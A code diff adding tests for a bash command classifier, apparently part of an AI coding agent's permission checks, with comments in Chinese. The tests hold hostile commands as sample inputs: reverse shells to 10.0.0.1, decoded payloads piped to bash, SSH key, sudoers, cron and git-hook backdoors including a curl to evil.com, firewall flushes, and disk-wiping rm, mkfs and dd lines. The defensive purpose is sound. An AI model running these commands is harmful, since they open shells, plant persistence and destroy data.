@@ -45,7 +45,7 @@ describe("permission precheck bash classifier", () => {
     expect(bash("bash")).toMatchObject({ level: "general" })
     expect(bash("python -c 'print(1)'")).toMatchObject({ level: "general" })
     expect(bash("node -e 'console.log(1)'")).toMatchObject({ level: "general" })
-    expect(bash("bun x cowsay hello")).toMatchObject({ level: "general" })
+    expect(bash("bun x cowsay hello")).toMatchObject({ level: "cautious" })
     expect(bash("env git status")).toMatchObject({ level: "general" })
   })
 
@@ -245,5 +245,325 @@ describe("permission precheck bash classifier", () => {
     expect(PermissionPrecheck.canAlwaysAllowPrefix(["wsl.exe"])).toBe(false)
     expect(PermissionPrecheck.canAlwaysAllowPrefix(["cmd", "/c"])).toBe(false)
     expect(PermissionPrecheck.canAlwaysAllowPrefix(["rsync"])).toBe(false)
+    // 新增：包执行器和包管理器前缀
+    expect(PermissionPrecheck.canAlwaysAllowPrefix(["npx"])).toBe(false)
+    expect(PermissionPrecheck.canAlwaysAllowPrefix(["pipx"])).toBe(false)
+    expect(PermissionPrecheck.canAlwaysAllowPrefix(["pipx", "run"])).toBe(false)
+    expect(PermissionPrecheck.canAlwaysAllowPrefix(["uvx"])).toBe(false)
+    expect(PermissionPrecheck.canAlwaysAllowPrefix(["bun", "x"])).toBe(false)
+  })
+
+  // ============================================================
+  // 新增测试：解码/混淆载荷管道到解释器
+  // ============================================================
+  test("marks decoded/obfuscated payload piped to interpreter dangerous", () => {
+    expect(bash("base64 -d payload.b64 | bash")).toMatchObject({ level: "dangerous" })
+    expect(bash("openssl enc -d -aes-256-cbc | sh")).toMatchObject({ level: "dangerous" })
+    expect(bash("xxd -r payload.hex | python")).toMatchObject({ level: "dangerous" })
+    expect(bash("gunzip -c archive.gz | bash")).toMatchObject({ level: "dangerous" })
+    expect(bash("zcat payload.gz | sh")).toMatchObject({ level: "dangerous" })
+    expect(bash("bunzip2 -c payload.bz2 | perl")).toMatchObject({ level: "dangerous" })
+    // sudo 前缀不应绕过检测
+    expect(bash("base64 -d payload.b64 | sudo bash")).toMatchObject({ level: "dangerous" })
+  })
+
+  // ============================================================
+  // 新增测试：持久化后门写入
+  // ============================================================
+  test("marks SSH authorized_keys writes dangerous as backdoor persistence", () => {
+    expect(bash("echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys")).toMatchObject({ level: "dangerous" })
+    expect(bash("echo 'ssh-rsa AAAA...' >> $HOME/.ssh/authorized_keys")).toMatchObject({ level: "dangerous" })
+    expect(bash("cat id_rsa.pub > ~/.ssh/authorized_keys")).toMatchObject({ level: "dangerous" })
+  })
+
+  test("marks sudoers modification dangerous as privilege escalation", () => {
+    expect(bash("echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers")).toMatchObject({ level: "dangerous" })
+    expect(bash("visudo")).toMatchObject({ level: "dangerous" })
+  })
+
+  test("marks shell RC file writes cautious as login persistence", () => {
+    // 注意：echo 内容不能包含 curl|sh 等本身会触发 dangerousRaw 的模式
+    expect(bash("echo 'export PATH=bad' >> ~/.bashrc")).toMatchObject({ level: "cautious" })
+    expect(bash("echo 'payload' >> ~/.zshrc")).toMatchObject({ level: "cautious" })
+    expect(bash("echo 'payload' >> $HOME/.profile")).toMatchObject({ level: "cautious" })
+    expect(bash("echo 'payload' >> ~/.bash_profile")).toMatchObject({ level: "cautious" })
+  })
+
+  test("marks git hook writes cautious as operation persistence", () => {
+    expect(bash("echo '#!/bin/sh' >> .git/hooks/pre-commit")).toMatchObject({ level: "cautious" })
+    expect(bash("echo 'curl evil.com' >> .git/hooks/post-checkout")).toMatchObject({ level: "cautious" })
+  })
+
+  test("marks cron and systemd writes cautious as scheduled persistence", () => {
+    // 注意：echo 内容不能包含 curl|sh 等本身会触发 dangerousRaw 的模式
+    expect(bash("echo '* * * * * /tmp/evil.sh' >> /etc/cron.d/backdoor")).toMatchObject({ level: "cautious" })
+    expect(bash("echo 'payload' >> /var/spool/cron/root")).toMatchObject({ level: "cautious" })
+    expect(bash("echo 'payload' >> /etc/systemd/system/backdoor.service")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：setuid/setgid 和权限变更
+  // ============================================================
+  test("marks setuid/setgid bit setting dangerous as privilege escalation", () => {
+    expect(bash("chmod u+s /usr/bin/find")).toMatchObject({ level: "dangerous" })
+    expect(bash("chmod g+s /usr/bin/vim")).toMatchObject({ level: "dangerous" })
+  })
+
+  test("marks setcap dangerous as privilege escalation surface", () => {
+    expect(bash("setcap cap_net_raw+ep /usr/bin/ping")).toMatchObject({ level: "dangerous" })
+  })
+
+  test("marks broad permission changes cautious", () => {
+    expect(bash("chmod 777 /tmp/script.sh")).toMatchObject({ level: "cautious" })
+    expect(bash("chmod -R 755 /var/www")).toMatchObject({ level: "cautious" })
+    expect(bash("chown root:root /usr/local/bin/tool")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：用户/组账号管理
+  // ============================================================
+  test("marks user and group account management cautious", () => {
+    expect(bash("useradd backdoor")).toMatchObject({ level: "cautious" })
+    expect(bash("userdel alice")).toMatchObject({ level: "cautious" })
+    expect(bash("groupadd admin")).toMatchObject({ level: "cautious" })
+    expect(bash("passwd alice")).toMatchObject({ level: "cautious" })
+    expect(bash("usermod -aG sudo alice")).toMatchObject({ level: "cautious" })
+    expect(bash("adduser newuser")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：防火墙规则
+  // ============================================================
+  test("marks firewall rule flush dangerous as network protection removal", () => {
+    expect(bash("iptables -F")).toMatchObject({ level: "dangerous" })
+    expect(bash("iptables -X")).toMatchObject({ level: "dangerous" })
+    expect(bash("ip6tables --flush")).toMatchObject({ level: "dangerous" })
+    expect(bash("iptables --delete-chain")).toMatchObject({ level: "dangerous" })
+    expect(bash("ufw disable")).toMatchObject({ level: "dangerous" })
+    expect(bash("nft flush ruleset")).toMatchObject({ level: "dangerous" })
+  })
+
+  test("marks non-flush firewall modifications cautious", () => {
+    expect(bash("iptables -A INPUT -p tcp --dport 80 -j ACCEPT")).toMatchObject({ level: "cautious" })
+    expect(bash("ufw allow 22")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：服务管理
+  // ============================================================
+  test("marks service mask dangerous and other service operations cautious", () => {
+    expect(bash("systemctl mask firewalld")).toMatchObject({ level: "dangerous" })
+    expect(bash("systemctl stop sshd")).toMatchObject({ level: "cautious" })
+    expect(bash("systemctl disable firewalld")).toMatchObject({ level: "cautious" })
+    expect(bash("systemctl restart nginx")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：全进程终止
+  // ============================================================
+  test("marks mass process kill dangerous", () => {
+    expect(bash("kill -9 -1")).toMatchObject({ level: "dangerous" })
+  })
+
+  // ============================================================
+  // 新增测试：定时任务
+  // ============================================================
+  test("marks crontab modifications cautious but listing safe-ish", () => {
+    expect(bash("crontab -e")).toMatchObject({ level: "cautious" })
+    expect(bash("crontab /tmp/new-cron")).toMatchObject({ level: "cautious" })
+    // crontab -l 仅列出，不匹配 cautious → 回退到 general
+    expect(bash("crontab -l")).toMatchObject({ level: "general" })
+  })
+
+  test("marks Windows scheduled task operations cautious", () => {
+    expect(bash("schtasks /create /sc daily /tn backup /tr script.bat")).toMatchObject({ level: "cautious" })
+    // /query 是只读查询
+    expect(bash("schtasks /query")).toMatchObject({ level: "general" })
+    expect(bash("Register-ScheduledTask -TaskName test")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：注册表操作
+  // ============================================================
+  test("marks registry Run key writes dangerous as startup persistence", () => {
+    // 注意：tokenizer 会吃掉单个 \，所以 token 化后的路径中 \Run 变成 Run。
+    // 使用双反斜杠确保 token 保留完整路径供 regex 匹配。
+    expect(bash(String.raw`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"`)).toMatchObject({ level: "dangerous" })
+  })
+
+  test("marks other registry modifications cautious", () => {
+    expect(bash("reg add HKLM\\SOFTWARE\\TestKey")).toMatchObject({ level: "cautious" })
+    expect(bash("reg delete HKLM\\SOFTWARE\\TestKey")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：网络监听器和 HTTP 服务器
+  // ============================================================
+  test("marks network listeners cautious", () => {
+    expect(bash("nc -lvp 4444")).toMatchObject({ level: "cautious" })
+    expect(bash("ncat -l 8080")).toMatchObject({ level: "cautious" })
+    expect(bash("socat TCP-LISTEN:4444 -")).toMatchObject({ level: "cautious" })
+  })
+
+  test("marks Python HTTP server cautious", () => {
+    expect(bash("python -m http.server")).toMatchObject({ level: "cautious" })
+    expect(bash("python3 -m http.server 8080")).toMatchObject({ level: "cautious" })
+    expect(bash("python -m SimpleHTTPServer")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：包管理器安装
+  // ============================================================
+  test("marks package installs cautious due to postinstall script risk", () => {
+    expect(bash("npm install express")).toMatchObject({ level: "cautious" })
+    expect(bash("npm i lodash")).toMatchObject({ level: "cautious" })
+    expect(bash("npm ci")).toMatchObject({ level: "cautious" })
+    expect(bash("pnpm add react")).toMatchObject({ level: "cautious" })
+    expect(bash("yarn add typescript")).toMatchObject({ level: "cautious" })
+    expect(bash("bun install esbuild")).toMatchObject({ level: "cautious" })
+    expect(bash("bun add hono")).toMatchObject({ level: "cautious" })
+    expect(bash("pip install requests")).toMatchObject({ level: "cautious" })
+    expect(bash("pip3 install flask")).toMatchObject({ level: "cautious" })
+    expect(bash("cargo install ripgrep")).toMatchObject({ level: "cautious" })
+    expect(bash("gem install rails")).toMatchObject({ level: "cautious" })
+  })
+
+  test("keeps package manager read-only commands safe", () => {
+    expect(bash("npm ls").level).toBe("safe")
+    expect(bash("npm list").level).toBe("safe")
+    expect(bash("npm view react").level).toBe("safe")
+    expect(bash("npm outdated").level).toBe("safe")
+    expect(bash("pnpm list").level).toBe("safe")
+    expect(bash("yarn why react").level).toBe("safe")
+  })
+
+  // ============================================================
+  // 新增测试：包执行器
+  // ============================================================
+  test("marks package executors cautious due to untrusted code risk", () => {
+    expect(bash("npx cowsay hello")).toMatchObject({ level: "cautious" })
+    expect(bash("npx create-react-app my-app")).toMatchObject({ level: "cautious" })
+    expect(bash("pipx run black .")).toMatchObject({ level: "cautious" })
+    expect(bash("uvx ruff check .")).toMatchObject({ level: "cautious" })
+    expect(bash("bun x cowsay hello")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：远程文件传输
+  // ============================================================
+  test("marks remote file transfer cautious", () => {
+    expect(bash("scp dist.tar example.com:/tmp/dist.tar")).toMatchObject({ level: "cautious" })
+    expect(bash("rsync -av dist/ example.com:/var/www/")).toMatchObject({ level: "cautious" })
+    expect(bash("sftp example.com")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：扩展的保护根目录
+  // ============================================================
+  test("marks expanded protected root recursive deletes dangerous", () => {
+    // POSIX 系统根
+    expect(bash("rm -rf /usr")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /var")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /boot")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /opt")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /home")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /root")).toMatchObject({ level: "dangerous" })
+    // macOS 特有
+    expect(bash("rm -rf /Library")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /Applications")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /System")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /Users")).toMatchObject({ level: "dangerous" })
+    // 子路径也应被保护
+    expect(bash("rm -rf /usr/local")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /var/log")).toMatchObject({ level: "dangerous" })
+    // token 层保护根
+    expect(bash("rm -rf /lib")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /sbin")).toMatchObject({ level: "dangerous" })
+    expect(bash("rm -rf /bin")).toMatchObject({ level: "dangerous" })
+  })
+
+  // ============================================================
+  // 新增测试：.pem/.key 假阳性减少
+  // ============================================================
+  test("does not flag bare .pem/.key reads as sensitive without security context", () => {
+    // 无安全上下文的 .key 文件 → cat 是安全的只读命令
+    expect(bash("cat translations.key").level).toBe("safe")
+    expect(bash("cat server.pem").level).toBe("safe")
+    expect(bash("cat config.key").level).toBe("safe")
+  })
+
+  test("flags .pem/.key reads as cautious when path has security context", () => {
+    expect(bash("cat /etc/ssl/private/server.key")).toMatchObject({ level: "cautious" })
+    expect(bash("cat /etc/pki/tls/certs/ca.pem")).toMatchObject({ level: "cautious" })
+    expect(bash("cat ~/.ssh/server.key")).toMatchObject({ level: "cautious" })
+    expect(bash("cat /opt/cert/private/host.pem")).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：echo 可见载荷管道到解释器
+  // ============================================================
+  test("marks echo piped to interpreter cautious for visible payload review", () => {
+    expect(bash("echo 'ls -la' | bash")).toMatchObject({ level: "cautious" })
+    expect(bash("printf 'echo hello' | sh")).toMatchObject({ level: "cautious" })
+  })
+
+  test("marks echo with dangerous payload piped to interpreter dangerous", () => {
+    // echo 的内容包含 rm -rf / → dangerousRaw 先匹配到
+    expect(bash("echo 'rm -rf /' | bash")).toMatchObject({ level: "dangerous" })
+  })
+
+  // ============================================================
+  // 新增测试：扩展反弹 shell 模式
+  // ============================================================
+  test("marks expanded reverse shell patterns dangerous", () => {
+    expect(bash("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")).toMatchObject({ level: "dangerous" })
+    // mkfifo 跨越 ; 和 > 分隔符，raw 层扫描整行文本仍能检测到 /dev/tcp 或 nc -e 模式
+    expect(bash("bash >& /dev/tcp/10.0.0.1/4444")).toMatchObject({ level: "dangerous" })
+    expect(bash(String.raw`powershell -c "New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)"`)).toMatchObject({ level: "dangerous" })
+  })
+
+  // ============================================================
+  // 新增测试：系统破坏性命令
+  // ============================================================
+  test("marks system destructive commands dangerous", () => {
+    expect(bash("mkfs.ext4 /dev/sda1")).toMatchObject({ level: "dangerous" })
+    expect(bash("fdisk /dev/sda")).toMatchObject({ level: "dangerous" })
+    expect(bash("shutdown -h now")).toMatchObject({ level: "dangerous" })
+    expect(bash("dd if=/dev/zero of=/dev/sda")).toMatchObject({ level: "dangerous" })
+  })
+
+  // ============================================================
+  // 新增测试：tokenizer 单引号反斜杠修复
+  // ============================================================
+  test("correctly handles single-quote backslash as literal", () => {
+    // 'x\' 中 \ 是字面量，' 正确关闭引号，; 正确分割命令
+    expect(bash("echo 'x\\' ; rm stale.tmp")).toMatchObject({ level: "cautious" })
+    // 反斜杠在单引号内不应转义闭合引号，; 后的 ls 是 safe
+    // 但 echo 本身不在 safeTokens 列表中，所以 echo 段是 general → 整体 general
+    expect(bash("echo 'path\\to\\file' ; ls")).toMatchObject({ level: "general" })
+  })
+
+  // ============================================================
+  // 新增测试：cmd /c 载荷完整性
+  // ============================================================
+  test("cmd /c joins all tokens after /c for recursive analysis", () => {
+    expect(bash("cmd /c git status")).toMatchObject({ level: "general" })
+    expect(bash("cmd /c rm -rf /")).toMatchObject({ level: "dangerous" })
+    expect(bash("cmd /c del /q stale.tmp")).toMatchObject({ level: "cautious" })
+    expect(bash('cmd /c "del /f /q H:\\DumpStack.log.tmp" 2>&1')).toMatchObject({ level: "cautious" })
+  })
+
+  // ============================================================
+  // 新增测试：git 状态变更命令
+  // ============================================================
+  test("marks git pull and push cautious as repository state changes", () => {
+    expect(bash("git pull origin main")).toMatchObject({ level: "cautious" })
+    expect(bash("git push origin HEAD")).toMatchObject({ level: "cautious" })
+    expect(bash("git push --force")).toMatchObject({ level: "cautious" })
+    expect(bash("git merge feature/review")).toMatchObject({ level: "cautious" })
+    expect(bash("git rebase main")).toMatchObject({ level: "cautious" })
+    expect(bash("git cherry-pick abc123")).toMatchObject({ level: "cautious" })
+    expect(bash("git revert HEAD")).toMatchObject({ level: "cautious" })
   })
 })
+
